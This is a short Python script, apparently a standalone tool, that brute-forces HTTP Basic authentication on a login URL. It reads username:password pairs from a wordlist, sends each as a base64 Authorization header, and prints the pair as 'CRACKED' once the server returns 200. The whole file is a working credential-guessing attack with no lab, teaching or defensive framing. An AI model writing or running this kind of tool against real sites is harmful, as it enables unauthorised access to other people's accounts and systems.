#!/usr/bin/env python

from sys import argv
import os.path
import requests
import base64
from colorama import Fore as foreground

if len(argv) != 3:
    print "Usage:\n\t python %s <wordlist> <url>\n" % argv[0]
    exit(1)

if os.path.isfile(argv[1]):
    wordlist = open(argv[1], "r")

else:
    print "Error:\n\t Wordlist not found!\n"
    exit(1)

# Login Page URL
url = argv[2]
words = list(map(lambda line: line.split(":"), wordlist.readlines()))

for [user, passwd] in words:
    user_pass = "%s:%s" % (user.strip(), passwd.strip())
    base64_value = base64.encodestring(user_pass).split()[0]
    hdr = {'Authorization': "Basic %s" % base64_value}

    try:
        res = requests.get(url, headers = hdr)
    except:
        print "No such URL"
        exit(1)

    if res.status_code == 200 :
       print foreground.GREEN + "%s CRACKED: "% res.status_code + user + ":" + passwd + foreground.RESET
       exit(0)

    elif res.status_code == 401 :
        print "FAILED %s: %s:%s" % (res.status_code, user, passwd)

    else:
        print "Unexpected Status Code: %d " % res.status_code
